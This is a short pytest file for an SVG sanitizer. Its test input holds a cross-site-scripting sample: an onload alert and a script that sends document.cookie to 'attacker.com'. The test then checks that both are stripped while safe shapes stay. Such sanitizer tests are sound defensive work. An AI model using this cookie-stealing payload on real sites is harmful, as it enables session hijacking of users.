import pytest
from backend.app.services.svg_sanitizer import sanitize_svg_content

def test_svg_sanitizer_removes_malicious_scripts():
    malicious_svg = b"""
    <svg xmlns="http://w3.org" width="100" height="100">
        <circle cx="50" cy="50" r="40" onload="alert('XSS Exploit')" />
        <script type="text/javascript">
            document.location='http://attacker.com' + document.cookie;
        </script>
    </svg>
    """
    
    sanitized_output = sanitize_svg_content(malicious_svg).decode('utf-8')
    
    # Assert elements have been successfully neutralised
    assert 'script' not in sanitized_output
    assert 'onload' not in sanitized_output
    assert 'circle' in sanitized_output  # Validate that safe paths are preserved
